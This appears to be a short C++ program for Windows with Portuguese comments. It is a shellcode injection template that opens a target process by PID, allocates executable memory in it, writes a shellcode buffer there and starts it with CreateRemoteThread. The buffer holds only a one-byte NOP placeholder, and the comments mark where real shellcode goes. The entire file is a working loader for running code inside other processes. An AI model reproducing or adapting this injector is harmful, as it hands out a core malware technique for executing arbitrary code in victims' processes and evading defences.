#include <iostream>
#include <windows.h>


int main(){
    DWORD pid = 26636; // pid do processo alvo
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    unsigned char shellcode[] = {0x90}; // aqui vai conter o conteúdo da shellcode
    SIZE_T size = sizeof(shellcode); // tamanho da shellcode (sizeof(shellcode))
    LPVOID addr = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); // addr vai ser o endereço da memoria onde foi alocado nosso shellcode

    if(addr == NULL){
        DWORD error = ::GetLastError();
        std::string message = std::system_category().message(error);
        std::cerr << message << std::endl;
        return -1;
    }

    SIZE_T lpNumberOfBytesWritten; // quantidade de bytes transferidos para o processo

    if(!WriteProcessMemory(hProcess, addr, (LPCVOID)shellcode, size, &lpNumberOfBytesWritten)){
        DWORD error = ::GetLastError();
        std::string message = std::system_category().message(error);
        std::cerr << message << std::endl;
        return -1;
    };

    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if(hRemoteThread == NULL){
        DWORD error = ::GetLastError();
        std::string message = std::system_category().message(error);
        std::cerr << message << std::endl;
        return -1;
    }

    std::cout << "Shellcode injetada e thread criada com sucesso!" << std::endl;
    return 0;
}